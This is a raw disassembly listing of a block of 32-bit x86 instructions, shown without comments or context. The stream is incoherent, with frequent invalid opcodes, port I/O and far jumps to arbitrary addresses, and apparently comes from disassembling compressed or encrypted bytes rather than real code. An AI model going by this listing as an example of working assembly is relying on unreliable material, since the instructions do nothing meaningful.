  4246b1:	xor    bl,BYTE PTR [edx+edi*8]
  4246b4:	dec    esp
  4246b5:	(bad)  
  4246b6:	mov    dl,0x53
  4246b8:	dec    ebp
  4246b9:	xchg   DWORD PTR [ebp-0x327f9d3a],edi
  4246bf:	sbb    DWORD PTR [ecx],edx
  4246c1:	cmp    DWORD PTR [edx-0x4],edx
  4246c4:	inc    ecx
  4246c5:	call   0x6084957
  4246ca:	push   ebx
  4246cb:	mov    ah,dh
  4246cd:	pushf  
  4246ce:	std    
  4246cf:	xor    ebx,esp
  4246d1:	or     eax,0xe5bacbee
  4246d6:	mov    bh,0xb1
  4246d8:	mov    ecx,0x6fba96fc
  4246dd:	push   ds
  4246de:	jbe    0x4246d6
  4246e0:	test   DWORD PTR [ebx+ebx*2],ebx
  4246e3:	fistp  QWORD PTR [ecx*1+0x11fdb0ea]
  4246ea:	jecxz  0x4246d5
  4246ec:	scas   al,BYTE PTR es:[edi]
  4246ed:	neg    DWORD PTR [ebx+0x64316b43]
  4246f3:	fld    QWORD PTR ds:0x76559ebd
  4246f9:	je     0x4246f0
  4246fb:	mov    ebx,0x3d274ab3
  424700:	lock xor BYTE PTR [edi+0x3e78d6f9],0xec
  424708:	pop    edi
  424709:	stos   DWORD PTR es:[edi],eax
  42470a:	in     eax,0x42
  42470c:	sub    DWORD PTR [eax-0x673db5f0],ebp
  424712:	push   0xffffffff
  424714:	out    dx,eax
  424715:	add    dl,ah
  424717:	sti    
  424718:	scas   eax,DWORD PTR es:[edi]
  424719:	aas    
  42471a:	and    eax,DWORD PTR [ecx]
  42471c:	pop    ecx
  42471d:	sbb    ecx,esp
  42471f:	xchg   ebp,eax
  424720:	cwde   
  424721:	rcr    DWORD PTR [ebx],1
  424723:	xchg   esi,eax
  424724:	xchg   DWORD PTR [edi-0xebc945b],ecx
  42472a:	retf   
  42472b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42472c:	dec    edi
  42472d:	stc    
  42472e:	pop    ecx
  42472f:	cmc    
  424730:	jmp    0x750d73a2
  424735:	sub    eax,0xdd62e02e
  42473a:	cmp    dh,BYTE PTR [ecx+0x39]
  42473d:	xor    eax,0x7b409762
  424742:	adc    ebx,edi
  424744:	mov    ecx,0x626467a6
  424749:	inc    ebp
  42474a:	and    al,0x63
  42474c:	stos   BYTE PTR es:[edi],al
  42474d:	fdivr  st(3),st
  42474f:	stc    
  424750:	mov    eax,0x33d8bc31
  424755:	and    DWORD PTR [ecx+edx*8-0x3c],ebp
  424759:	mov    bh,dh
  42475b:	push   edi
  42475c:	iret   
  42475d:	pop    edx
  42475e:	lock (bad) 
  424760:	adc    ebp,edi
  424762:	pop    ss
  424763:	shl    BYTE PTR [eax],1
  424765:	xchg   ecx,eax
  424766:	and    eax,0xf3fb4f0e
  42476b:	(bad)
  42476e:	mov    ds:0x40e9a702,al
  424773:	popf   
  424774:	lds    ebp,FWORD PTR [ebx]
  424776:	dec    edi
  424777:	iret   
  424778:	loop   0x4247f1
  42477a:	sbb    al,0xc
  42477c:	mov    bh,0x62
  42477e:	mov    dl,0x22
  424780:	mov    fs,WORD PTR [ebx+0x4b]
  424783:	pop    ebp
  424784:	push   cs
  424785:	cwde   
  424786:	fsubp  st(1),st
  424788:	js     0x42475a
  42478a:	cs je  0x4247b2
  42478d:	sar    BYTE PTR [edi],cl
  42478f:	mov    bl,0x5
  424791:	cmp    BYTE PTR [edx],ah
  424793:	call   0xb513221e
  424798:	fwait
  424799:	enter  0x85b8,0x25
  42479d:	clc    
  42479e:	in     al,0x59
  4247a0:	ins    DWORD PTR es:[edi],dx
  4247a1:	out    dx,eax
  4247a2:	xor    cl,BYTE PTR [esi+eiz*1+0x2a]
  4247a6:	and    BYTE PTR ds:0x5901cc5e,dh
  4247ac:	dec    esi
  4247ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4247ae:	mov    DWORD PTR [ecx],edi
  4247b0:	pop    eax
  4247b1:	cs ja  0x42474a
  4247b4:	mov    dl,0x7c
  4247b6:	jle    0x4247f8
  4247b8:	inc    ebp
  4247b9:	jecxz  0x42477b
  4247bb:	mov    dh,0xef
  4247bd:	mov    edi,0xd939693d
  4247c2:	mov    dl,0x65
  4247c4:	(bad)  
  4247c6:	jb     0x424772
  4247c8:	mov    ebx,0x119d12a2
  4247cd:	xor    dh,BYTE PTR [eax-0xb518fc3]
  4247d3:	pop    ds
  4247d4:	lods   eax,DWORD PTR ds:[esi]
  4247d5:	mov    dh,0xb9
  4247d7:	imul   edi,DWORD PTR [ebx],0xffffff8e
  4247da:	mul    cl
  4247dc:	xlat   BYTE PTR ds:[ebx]
  4247dd:	in     al,dx
  4247de:	cmp    ch,dl
  4247e0:	fdiv   QWORD PTR [ebx+0x5f]
  4247e3:	mov    al,ds:0xf2e82416
  4247e8:	xbegin 0x7fdef294
  4247ee:	je     0x42479c
  4247f0:	inc    esi
  4247f1:	jnp    0x424816
  4247f3:	ins    BYTE PTR es:[edi],dx
  4247f4:	(bad)  
  4247f6:	mov    BYTE PTR [edi],bh
  4247f8:	int    0x9e
  4247fa:	in     eax,0x62
  4247fc:	push   ebp
  4247fd:	(bad)  
  4247ff:	dec    ecx
  424800:	sti    
  424801:	xchg   ebp,eax
  424802:	push   ss
  424803:	js     0x42487f
  424805:	sbb    esp,edx
  424807:	test   BYTE PTR [edx+0x52],al
  42480a:	fiadd  DWORD PTR [edi+0xedda84]
  424810:	push   edi
  424811:	xchg   esi,eax
  424812:	test   al,0xf6
  424814:	jle    0x424805
  424816:	adc    eax,0x7c5dbf4c
  42481b:	jmp    0x424867
  42481d:	std    
  42481e:	out    0x6b,eax
  424820:	shr    DWORD PTR [esi-0x46],cl
  424823:	rcl    BYTE PTR [esi+esi*8-0x7a4ca9e0],1
  42482a:	push   ss
  42482b:	aam    0x95
  42482d:	and    dh,BYTE PTR [ecx-0x9b7495c]
  424833:	sub    ah,BYTE PTR [esi]
  424835:	inc    esi
  424836:	repz into 
  424838:	jg     0x42487b
  42483a:	iret   
  42483b:	out    dx,al
  42483c:	jmp    0xdece:0xe93ce7df
  424843:	mov    dh,ah
  424845:	xor    al,0x4a
  424847:	imul   esp,ebx,0xffffff8b
  42484a:	movd   mm6,DWORD PTR [edx-0x70]
  42484e:	push   es
  42484f:	clc    
  424850:	psubsw mm7,QWORD PTR [esi-0xa53b498]
  424857:	sub    DWORD PTR [ecx-0x62],ebx
  42485a:	pop    ebx
  42485b:	jno    0x424887
  42485d:	sbb    BYTE PTR [ecx+0x50],dh
  424860:	mov    fs,edx
  424862:	into   
  424863:	add    ah,BYTE PTR [esi-0x53]
  424866:	inc    eax
  424867:	or     ecx,DWORD PTR [esi-0x5146cbc3]
  42486d:	pop    ss
  42486e:	gs push 0xffffffe6
  424871:	retf   0x3f15
  424874:	jp     0x42487d
  424876:	jns    0x42488f
  424878:	call   0x5dbd:0xb08b0619
  42487f:	inc    edi
  424880:	sub    eax,0xa1e2a609
  424885:	dec    ecx
  424886:	add    BYTE PTR [eax],ch
  424888:	or     DWORD PTR [ecx],eax
  42488a:	mov    edx,0x4430777d
  42488f:	pop    esi
  424890:	ja     0x4248de
  424892:	xchg   edi,eax
  424893:	add    eax,0xafd791ed
  424898:	sbb    BYTE PTR [edx+0x7f],ch
  42489b:	xchg   DWORD PTR [ebp+0x1247e4b0],edx
  4248a1:	push   ds
  4248a2:	mov    esp,0x8f909d38
  4248a7:	nop
  4248a8:	sbb    eax,0x9311e373
  4248ad:	inc    esp
  4248ae:	dec    eax
  4248af:	mov    ah,0x14
  4248b1:	mov    al,ds:0x50283162
  4248b6:	and    eax,0x332b424c
  4248bb:	clc    
  4248bc:	sahf   
  4248bd:	and    BYTE PTR [eax+edx*2+0x9],dh
  4248c1:	mov    eax,ds:0x441ca902
  4248c6:	nop
  4248c7:	sub    DWORD PTR [ecx],ebx
  4248c9:	sbb    al,0xab
  4248cb:	hlt    
  4248cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4248cd:	mov    ecx,0xde2b8970
  4248d2:	dec    DWORD PTR [esp+eax*2]
  4248d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4248d6:	loope  0x42492d
  4248d8:	(bad)  [ecx]
  4248da:	adc    eax,0x83c08399
  4248df:	cwde   
  4248e0:	xchg   ecx,eax
  4248e1:	popf   
  4248e2:	or     al,0x13
  4248e4:	jg     0x4248c1
  4248e6:	xor    BYTE PTR [eax+0x4aa7ab46],ah
  4248ec:	fcomip st,st(5)
  4248ee:	lea    esp,[edx+0x27]
  4248f1:	imul   eax,edx,0x38
  4248f4:	imul   DWORD PTR ds:0xb1b40008
  4248fa:	sbb    DWORD PTR [ebx+0x5c4eac32],ebp
  424900:	cmp    dl,BYTE PTR [edi]
  424902:	xchg   ebp,eax
  424903:	call   FWORD PTR [edx-0x3c6c9a77]
  424909:	push   ds
  42490a:	mov    ecx,esp
  42490c:	int    0xea
  42490e:	dec    ecx
  42490f:	add    al,0x8
  424911:	or     DWORD PTR [ebp-0x509937fb],esp
  424917:	and    bh,ch
  424919:	aas    
  42491a:	in     eax,0x3
  42491c:	xchg   esp,eax
  42491d:	stos   DWORD PTR es:[edi],eax
  42491e:	cwde   
  42491f:	add    cl,BYTE PTR [esp+eax*2]
  424922:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424923:	imul   esp,DWORD PTR [ecx+0x5dd48875],0x51
  42492a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42492b:	scas   eax,DWORD PTR es:[edi]
  42492c:	fadd   QWORD PTR [eax]
  42492e:	add    BYTE PTR [eax],al
  424930:	add    BYTE PTR [eax],al
  424932:	adc    ecx,DWORD PTR [ebp-0x104094d7]
  424938:	push   ebx
  424939:	std    
  42493a:	and    ebp,DWORD PTR [ebx-0x25]
  42493d:	(bad)  
  42493e:	and    DWORD PTR [ebp-0x3df6e245],esi
  424944:	add    DWORD PTR [eax],eax
  424946:	repz add al,0x0
  424949:	add    BYTE PTR [edx-0x13],dl
  42494c:	mov    eax,DWORD PTR [ebp-0x39]
  42494f:	mov    eax,ds:0xfc0bc079
  424954:	mov    dh,0xe8
  424956:	out    0x75,eax
  424958:	cmp    eax,0xc7e42d35
  42495d:	(bad)  
  42495e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42495f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424960:	inc    ebx
  424961:	jmp    0x42495c
  424963:	mov    bl,0x24
  424965:	imul   ebx,DWORD PTR [ecx],0x34cf53b2
  42496b:	mov    ebx,0x9c49bfd
  424970:	mov    al,ds:0x13d1904
  424975:	adc    eax,0x89797570
  42497a:	mov    ds:0xbb6f652d,eax
  42497f:	sub    BYTE PTR [ebx-0x7f],bl
  424982:	jbe    0x424919
  424984:	retf   0xd72e
  424987:	out    0x86,eax
  424989:	jle    0x4249af
  42498b:	push   esp
  42498c:	jnp    0x4249b6
  42498e:	jmp    0xc5615a0d
  424993:	dec    eax
  424994:	xor    bp,WORD PTR [ebx-0xf561bbd]
  42499b:	(bad)  
  42499c:	dec    edi
  42499d:	jns    0x42495f
  42499f:	fidiv  WORD PTR [ecx-0x3e260170]
  4249a5:	xor    al,0x9f
  4249a7:	sbb    DWORD PTR [ecx],esi
  4249a9:	(bad)  [eax+esi*4-0x7c]
  4249ad:	xor    ah,cl
  4249af:	(bad)  
  4249b0:	fldenv [esi-0x4c]
  4249b3:	inc    esp
  4249b4:	push   eax
  4249b5:	push   ebx
  4249b6:	jno    0x424997
  4249b8:	fld    DWORD PTR [ebp+0x75]
  4249bb:	push   edx
  4249bc:	sar    DWORD PTR [esi],1
  4249be:	or     BYTE PTR [eax],bl
  4249c0:	retf   
  4249c1:	sub    esp,ebx
  4249c3:	or     ebp,DWORD PTR [eax+0x1004b0f9]
  4249c9:	jge    0x424a0f
  4249cb:	mov    al,ds:0x4c8ef42c
  4249d0:	shl    DWORD PTR fs:[eax+0x31fd5e18],1
  4249d7:	sti    
  4249d8:	popf   
  4249d9:	push   edx
  4249da:	mov    cl,0x56
  4249dc:	xor    DWORD PTR [ebx+0x38],0x3c
  4249e0:	(bad)  
  4249e2:	and    ah,bl
  4249e4:	and    cl,0xb8
  4249e7:	mov    ds:0xba4a7309,al
  4249ec:	mov    ch,0xe1
  4249ee:	mov    dh,0xae
  4249f0:	add    edx,DWORD PTR [ecx]
  4249f2:	add    al,0x44
  4249f4:	jns    0x42498d
  4249f6:	add    ah,dh
  4249f8:	retf   0x12d7
  4249fb:	or     al,0xcb
  4249fd:	xlat   BYTE PTR ds:[ebx]
  4249fe:	xchg   bh,bl
  424a00:	mov    eax,ds:0xf32c6cb0
  424a05:	mov    BYTE PTR ds:0x65f88999,al
  424a0b:	cs cwde 
  424a0d:	pop    esi
  424a0e:	test   DWORD PTR [eax],ebx
  424a10:	xlat   BYTE PTR cs:[ebx]
  424a12:	lods   al,BYTE PTR ds:[esi]
  424a13:	ret    
  424a14:	leave  
  424a15:	mov    bh,BYTE PTR [esi-0x330e69b6]
  424a1b:	call   0x94b2f644
  424a20:	push   ecx
  424a21:	ficom  DWORD PTR [eax+esi*4-0x80]
  424a25:	fbld   TBYTE PTR [ebx+edi*4]
  424a28:	imul   edx,DWORD PTR [edx-0x27],0x4ec90dc5
  424a2f:	push   ebx
  424a30:	retf   0x22a2
  424a33:	mov    bl,0x2e
  424a35:	mov    ebx,0x2f205a3
  424a3a:	test   ch,0x38
  424a3d:	mov    al,ds:0xea73bdc9
  424a42:	jmp    0xdc79:0x405758b9
  424a49:	scas   al,BYTE PTR es:[edi]
  424a4a:	enter  0x2cc1,0xe9
  424a4e:	jmp    0x424a35
  424a50:	call   0x46bf:0xfb9ab75c
  424a57:	lds    esp,FWORD PTR [ebp-0x31be6fa0]
  424a5d:	nop
  424a5e:	jne    0x424a0c
  424a60:	add    ch,BYTE PTR [esi-0x34432422]
  424a66:	add    ecx,0xc692182d
  424a6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424a6d:	cmp    al,0x1b
  424a6f:	add    esi,DWORD PTR [ebp-0x1]
  424a72:	xchg   esp,eax
  424a73:	and    eax,0x8ae6e7ab
  424a78:	mov    dh,0x68
  424a7a:	pop    ds
  424a7b:	frstor [ebp-0x69e75321]
  424a81:	adc    DWORD PTR [edx-0x49bdad78],edi
  424a87:	mov    ah,0x96
  424a89:	jle    0x424ad6
  424a8b:	(bad)  
  424a8c:	or     BYTE PTR [ebx],bl
  424a8e:	xor    edx,ecx
  424a90:	popa   
  424a91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424a92:	sub    bl,BYTE PTR [ebp-0x3073a11]
  424a98:	ret    
  424a99:	xchg   ebp,eax
  424a9a:	inc    eax
  424a9b:	mov    al,BYTE PTR [ebx+0x13]
  424a9e:	retf   0x2224
  424aa1:	add    DWORD PTR [eax+0x4],0xffffffdf
  424aa5:	test   BYTE PTR [edi+eax*8],dl
  424aa8:	or     DWORD PTR [eax+esi*4-0x51c964e5],ebp
  424aaf:	gs xchg esi,eax
  424ab1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424ab2:	mov    esi,0x196b3c87
  424ab7:	out    0x68,eax
  424ab9:	mov    edx,0x3d8de219
  424abe:	sub    eax,0xc86b0d9f
  424ac3:	inc    ebp
  424ac4:	add    bl,BYTE PTR [ebx-0x7fea7943]
  424aca:	rcr    DWORD PTR [ecx-0x73],0xe6
  424ace:	push   0xffffffb3
  424ad0:	std    
  424ad1:	inc    ecx
  424ad2:	xchg   ecx,eax
  424ad3:	add    eax,0x40fe7d14
  424ad8:	pop    esp
  424ad9:	mov    ebp,0xd188e073
  424ade:	cmp    BYTE PTR [eax],dh
  424ae0:	sub    bh,BYTE PTR [eax+0x222b0db0]
  424ae6:	sahf   
  424ae7:	cmp    esi,edi
  424ae9:	push   ds
  424aea:	rcl    BYTE PTR [esi+edx*8],cl
  424aed:	out    dx,eax
  424aee:	mov    ch,0x15
  424af0:	or     cl,al
  424af2:	adc    BYTE PTR [edx],dl
  424af4:	push   ds
  424af5:	and    BYTE PTR ds:0xcae24a08,bh
  424afb:	xchg   ebx,eax
  424afc:	out    dx,eax
  424afd:	push   ss
  424afe:	inc    ecx
  424aff:	push   ebp
  424b00:	mov    edi,esi
  424b02:	jecxz  0x424ab1
  424b04:	dec    edi
  424b05:	sub    eax,DWORD PTR [edx+0x3e]
  424b08:	(bad)  
  424b09:	loop   0x424af2
  424b0b:	mov    edx,0x5666a73f
  424b10:	pop    edx
  424b11:	lods   eax,DWORD PTR ds:[esi]
  424b12:	push   edi
  424b13:	cmp    al,0x15
  424b15:	or     DWORD PTR [edx-0x4f938148],edi
  424b1b:	pop    ebx
  424b1c:	(bad)  
  424b1d:	xchg   BYTE PTR [eax+0x23bb79bd],al
  424b23:	out    0x4d,al
  424b25:	loopne 0x424b7b
  424b27:	adc    ecx,eax
  424b29:	pop    esi
  424b2a:	mov    ebp,0x1ce98748
  424b2f:	lods   eax,DWORD PTR ds:[esi]
  424b30:	hlt    
  424b31:	loopne 0x424ab3
  424b33:	pop    esi
  424b34:	add    al,0xc8
  424b36:	sti    
  424b37:	xchg   bh,bl
  424b39:	dec    ecx
  424b3a:	sbb    al,0x9b
  424b3c:	xor    bh,ah
  424b3e:	mov    al,0xc2
  424b40:	cwde   
  424b41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424b42:	lahf   
  424b43:	hlt    
  424b44:	daa    
  424b45:	nop
  424b46:	out    dx,eax
  424b47:	call   0xe68523ff
  424b4c:	scas   al,BYTE PTR es:[edi]
  424b4d:	js     0x424b48
  424b4f:	rol    DWORD PTR [ebp-0x54],0xfb
  424b53:	retf   
  424b54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424b55:	fdiv   QWORD PTR [esi+0x514cc98f]
  424b5b:	out    dx,al
  424b5c:	jne    0x424b1d
  424b5e:	jae    0x424b35
  424b60:	stc    
  424b61:	jmp    0xc478:0x791e6efe
  424b68:	push   esi
  424b69:	adc    DWORD PTR [edi-0x40828013],0xc173d1fa
  424b73:	fwait
  424b74:	adc    al,0x85
  424b76:	fdivrp st(1),st
  424b78:	shl    DWORD PTR [ebp-0x70],1
  424b7b:	shr    BYTE PTR [edx],0x35
  424b7e:	push   esi
  424b7f:	stos   DWORD PTR es:[edi],eax
  424b80:	lods   al,BYTE PTR ds:[esi]
  424b81:	inc    ebx
  424b82:	lea    esi,[esi-0x16]
  424b85:	xchg   cl,cl
  424b87:	mov    DWORD PTR [esi-0x41d7831],esp
  424b8d:	mov    cl,cl
  424b8f:	mov    eax,ds:0xc814214b
  424b94:	addr16 in eax,dx
  424b96:	cld    
  424b97:	(bad)  
  424b98:	shl    BYTE PTR [eax+ebp*1],1
  424b9b:	add    DWORD PTR [ebp+0x76ba4d19],esp
  424ba1:	mov    dl,0xa1
  424ba3:	cmp    eax,0x2a7d8cfc
  424ba8:	jmp    0x424bf7
  424baa:	icebp  
  424bab:	js     0x424bef
  424bad:	and    DWORD PTR [edi+0x60],0x9427196f
  424bb4:	dec    esp
  424bb5:	jmp    0x4358:0xe625fa08
  424bbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424bbd:	inc    esp
  424bbe:	mov    ebp,0x48314eec
  424bc3:	popa   
  424bc4:	loop   0x424b87
  424bc6:	in     eax,0x48
  424bc8:	das    
  424bc9:	outs   dx,DWORD PTR ds:[esi]
  424bca:	jb     0x424b60
  424bcc:	sbb    eax,0x87d3562a
  424bd1:	test   eax,0xd8d8d866
  424bd6:	cmp    edx,DWORD PTR [edx-0x6df12a9b]
  424bdc:	stos   DWORD PTR es:[edi],eax
  424bdd:	push   ss
  424bde:	retf   0x2b18
  424be1:	std    
  424be2:	cwde   
  424be3:	add    DWORD PTR [ecx+0x6e],0x1bd67b18
  424bea:	dec    sp
  424bec:	cs test edi,edi
  424bef:	ss jbe 0x424bdc
  424bf2:	popf   
  424bf3:	dec    edx
  424bf4:	dec    esi
  424bf5:	xor    esp,DWORD PTR [edi]
  424bf7:	rcl    ebx,1
  424bf9:	push   0xffffffc0
  424bfb:	jle    0x424c3a
  424bfd:	fisubr DWORD PTR [ebx+0x34]
  424c00:	ret    0xd84c
  424c03:	dec    ebx
  424c04:	push   ss
  424c05:	and    eax,0x86d669d2
  424c0a:	ins    DWORD PTR es:[edi],dx
  424c0b:	repnz add ah,dh
  424c0e:	mov    WORD PTR [ebp-0x2a1ebc4c],ds
  424c14:	in     al,0x3c
  424c16:	scas   eax,DWORD PTR es:[edi]
  424c17:	mov    ecx,0x1a4a7455
  424c1c:	aas    
  424c1d:	scas   al,BYTE PTR es:[edi]
  424c1e:	mov    eax,ds:0xe6abf4de
  424c23:	jle    0x424c76
  424c25:	push   eax
  424c26:	dec    edx
  424c27:	imul   edx,DWORD PTR [esi+0x45],0xa433f5e8
  424c2e:	retf   0x1176
  424c31:	in     eax,dx
  424c32:	call   0xa78c:0x611c7a8a
  424c39:	into   
  424c3a:	mov    bl,BYTE PTR [ebx]
  424c3c:	dec    ecx
  424c3d:	mov    BYTE PTR [edi+esi*2],ch
  424c40:	or     edi,eax
  424c42:	mov    es,WORD PTR [ecx]
  424c44:	mov    dh,0xf4
  424c46:	jno    0x424ca5
  424c48:	push   ds
  424c49:	jge    0x424c8e
  424c4b:	stc    
  424c4c:	aam    0x20
  424c4e:	jo     0x424cc9
  424c50:	cmp    eax,0x4de16e8a
  424c55:	jl     0x424bd9
  424c57:	into   
  424c58:	(bad)  
  424c59:	mov    ebx,0x116752ea
  424c5e:	stos   BYTE PTR es:[edi],al
  424c5f:	and    DWORD PTR [ecx+eiz*2+0x68284a9b],esi
  424c66:	out    dx,eax
  424c67:	mov    edi,0x4df8402
  424c6c:	ret    0xfea8
  424c6f:	popa   
  424c70:	inc    esp
  424c71:	ret    
  424c72:	(bad)  
  424c73:	jb     0x424c51
  424c75:	(bad)  
  424c76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424c77:	aas    
  424c78:	jl     0x424ce8
  424c7a:	mov    ah,BYTE PTR [ebp+0x33]
  424c7d:	(bad)  
  424c7e:	pop    DWORD PTR ds:0x179b4ccd
  424c84:	mov    dh,0xf6
  424c86:	or     al,0xb7
  424c88:	test   al,0xc6
  424c8a:	fwait
  424c8b:	ret    
  424c8c:	call   0x3748:0xead6acc6
  424c93:	jnp    0x424c25
  424c95:	mov    ch,BYTE PTR [ebx-0x5d61b878]
  424c9b:	sub    al,al
  424c9d:	ds lahf 
  424c9f:	int    0x8a
  424ca1:	sub    al,0xf
  424ca3:	into   
  424ca4:	and    al,bh
  424ca6:	pop    ebx
  424ca7:	xchg   edi,eax
  424ca8:	pop    esi
  424ca9:	cs ja  0x424c48
  424cac:	sti    
  424cad:	gs pop eax
  424caf:	(bad)  
  424cb0:	pop    edx
  424cb1:	jmp    0x424c7d
  424cb3:	adc    DWORD PTR [eax],0xddc59f6b
  424cb9:	inc    esp
  424cba:	lea    ecx,[ebx+0x14]
  424cbd:	scas   al,BYTE PTR es:[edi]
  424cbe:	stos   DWORD PTR es:[edi],eax
  424cbf:	add    eax,0xe56fc119
  424cc4:	ins    DWORD PTR es:[edi],dx
  424cc5:	jecxz  0x424cdd
  424cc7:	(bad)  
  424cc8:	stos   BYTE PTR es:[edi],al
  424cc9:	test   al,0xdd
  424ccb:	adc    al,0xba
  424ccd:	adc    DWORD PTR [eax],edi
  424ccf:	out    dx,eax
  424cd0:	add    BYTE PTR [ebp-0x2b],cl
  424cd3:	xchg   ebx,eax
  424cd4:	inc    ebp
  424cd5:	and    ch,0xe4
  424cd8:	jge    0x424d3a
  424cda:	pusha  
  424cdb:	dec    edx
  424cdc:	(bad)  
  424cdd:	daa    
  424cde:	dec    ebp
  424cdf:	ret    
  424ce0:	pusha  
  424ce1:	or     al,bl
  424ce3:	test   DWORD PTR [ecx+0x7f82116d],esi
  424ce9:	mov    ecx,0xb4bed37c
  424cee:	mov    eax,ds:0x3bc6909a
  424cf3:	pop    edx
  424cf4:	mov    ds:0xa61d8951,al
  424cf9:	loop   0x424cb2
  424cfb:	dec    ecx
  424cfc:	popf   
  424cfd:	xor    BYTE PTR [ebx-0x3d19cb5b],0x7
  424d04:	mov    dl,0x41
  424d06:	inc    esi
  424d07:	xor    eax,0xda5fe038
  424d0c:	mov    DWORD PTR [edx+0x3f477967],ecx
  424d12:	scas   al,BYTE PTR es:[edi]
  424d13:	into   
  424d14:	cmp    BYTE PTR ds:0x29e637e1,0xaf
  424d1b:	jne    0x424d98
  424d1d:	mov    ds:0x3247f780,al
  424d22:	or     eax,0x41906450
  424d27:	mov    dl,0xeb
  424d29:	or     BYTE PTR [ecx-0x5e],bl
  424d2c:	xor    eax,0x1c63e3e3
  424d31:	jecxz  0x424d95
  424d33:	stc    
  424d34:	jmp    0x2e2b8590
  424d39:	popa   
  424d3a:	add    cl,BYTE PTR [edi-0x82e75d2]
  424d40:	in     eax,0x12
  424d42:	add    BYTE PTR [edx-0x183a79db],bl
  424d48:	clc    
  424d49:	inc    ecx
  424d4a:	pop    edx
  424d4b:	(bad)  
  424d4d:	adc    BYTE PTR [eax+0x7c931549],dh
  424d53:	mov    edx,0xb732d270
  424d58:	fs mov esi,0x62059722
  424d5e:	pusha  
  424d5f:	loope  0x424d00
  424d61:	adc    bl,BYTE PTR ds:0x52088a65
  424d67:	daa    
  424d68:	xor    al,0x97
  424d6a:	sub    eax,0xe669ff57
  424d6f:	cmp    ebp,0xffffffc5
  424d72:	mov    edi,0xe8940c86
  424d77:	fnsave [ebp+0x66e9266a]
  424d7d:	into   
  424d7e:	dec    eax
  424d7f:	push   ebp
  424d80:	aam    0x9b
  424d82:	pop    DWORD PTR [edx+0x5d]
  424d85:	add    DWORD PTR [edx-0x56],edx
  424d88:	push   esi
  424d89:	mov    dl,dh
  424d8b:	mov    edx,0xf6743912
  424d90:	pop    ds
  424d91:	scas   al,BYTE PTR es:[edi]
  424d92:	mov    esi,0x2baa979b
  424d97:	rcr    DWORD PTR [ecx-0x4571510f],1
  424d9d:	adc    ch,BYTE PTR [edi-0x3a]
  424da0:	leave  
  424da1:	vaddsd xmm3,xmm6,QWORD PTR [ecx]
  424da5:	mov    ds:0x90c9d316,eax
  424daa:	and    edx,eax
  424dac:	int    0x99
  424dae:	push   edx
  424daf:	adc    BYTE PTR [ecx+ecx*1+0x3],dl
  424db3:	addr16 shl ebp,1
  424db6:	fmul   DWORD PTR [edi+0x50]
  424db9:	xor    DWORD PTR [edx-0x4183a83b],0x594b5dcf
  424dc3:	or     edx,ebx
  424dc5:	mov    al,ds:0x64e0818c
  424dca:	mov    ah,0x67
  424dcc:	out    dx,al
  424dcd:	pop    eax
  424dce:	push   ss
  424dcf:	jge    0x424d97
  424dd1:	pop    edi
  424dd2:	int3   
  424dd3:	out    dx,al
  424dd4:	jae    0x424d97
  424dd6:	add    DWORD PTR [edx+0x2ddda7b3],eax
  424ddc:	call   edx
  424dde:	stos   DWORD PTR es:[edi],eax
  424ddf:	stos   DWORD PTR es:[edi],eax
  424de0:	gs loop 0x424db6
  424de3:	dec    edx
  424de4:	fist   WORD PTR ss:[edi-0x563f0d32]
  424deb:	inc    edi
  424dec:	push   0x1f
  424dee:	popf   
  424def:	mov    eax,0x4b64318e
  424df4:	adc    BYTE PTR [edx-0x61df51cf],dh
  424dfa:	sub    eax,0xa7a81748
  424dff:	and    DWORD PTR [ebp-0x50],esp
  424e02:	clc    
  424e03:	push   ebp
  424e04:	mov    ah,0x38
  424e06:	mov    eax,cs:0x1ab81e92
  424e0c:	enter  0xb5a5,0x91
  424e10:	daa    
  424e11:	data16 cld 
  424e13:	imul   esp,DWORD PTR [esi-0x35],0xc
  424e17:	add    BYTE PTR [edi-0x31],ch
  424e1a:	popf   
  424e1b:	int3   
  424e1c:	imul   esp,DWORD PTR [edx+0x77a68f14],0xffffffef
  424e23:	mov    bh,0xf9
  424e25:	stos   BYTE PTR es:[edi],al
  424e26:	mov    esi,0x1e16f276
  424e2b:	sbb    bh,BYTE PTR [ebx+0x37]
  424e2e:	jne    0x424ea5
  424e30:	les    ebx,FWORD PTR [esi+edx*2]
  424e33:	sub    esi,edx
  424e35:	mov    BYTE PTR [edx+0x247da35d],ah
  424e3b:	dec    eax
  424e3c:	jb     0x424e3e
  424e3e:	add    BYTE PTR [eax],al
  424e40:	add    BYTE PTR [eax],al
  424e42:	add    BYTE PTR [edi+ecx*2+0x7],0xcf
  424e47:	bswap  eax
  424e49:	(bad)  
  424e4a:	test   al,0x2c
  424e4c:	dec    eax
  424e4d:	or     ebx,DWORD PTR [edi-0x3f86d54]
  424e53:	mov    BYTE PTR [ecx],0x0
  424e56:	repz add al,0x0
  424e59:	add    BYTE PTR [eax+0x3b47dc0e],ch
  424e5f:	int    0x88
  424e61:	pop    esi
  424e62:	sbb    BYTE PTR [ebx+0x66],bh
  424e65:	jg     0x424ed8
  424e67:	jl     0x424ec4
  424e69:	leave  
  424e6a:	aad    0x92
  424e6c:	inc    edx
  424e6d:	sbb    ebp,DWORD PTR [ecx-0x77]
  424e70:	inc    ebx
  424e71:	cli    
  424e72:	in     eax,dx
  424e73:	(bad)  
  424e74:	loop   0x424e1b
  424e76:	push   esp
  424e77:	jno    0x424ebf
  424e79:	fldcw  WORD PTR [ebx]
  424e7b:	dec    ebx
  424e7c:	outs   dx,DWORD PTR cs:[esi]
  424e7e:	jbe    0x424e64
  424e80:	(bad)  
  424e81:	(bad)  
  424e82:	cdq    
  424e83:	inc    ebp
  424e84:	sub    eax,0x708312ad
  424e89:	mov    ds,esi
  424e8b:	pusha  
  424e8c:	inc    dl
